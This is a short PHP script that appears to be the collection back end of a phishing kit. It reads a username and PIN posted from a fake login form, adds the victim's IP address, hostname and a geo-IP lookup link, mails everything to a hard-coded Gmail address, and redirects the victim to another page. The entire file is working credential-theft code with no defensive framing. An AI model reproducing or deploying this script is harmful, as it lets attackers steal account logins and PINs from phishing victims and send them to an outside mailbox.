<?php

$ZIK10=$_POST['ZIK1'];
$ZIK20=$_POST['ZIK2'];

$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['ZIK10'] = $ZIK10;
		$_SESSION['ZIK20'] = $ZIK20;    
       


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "~~~~~~~~~~~~\n";
$message .= "USRIINO : ".$_SESSION['ZIK10']."\n";
$message .= "PININOU : ".$_SESSION['ZIK20']."\n";
$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";

$email = "nsakolchi@gmail.com";
$subject = "LOGINOU sella Spyus Paparazzy $ip";
$back = "red00.htm";
mail($email, $subject, $message);

header("location: ".$back);
?>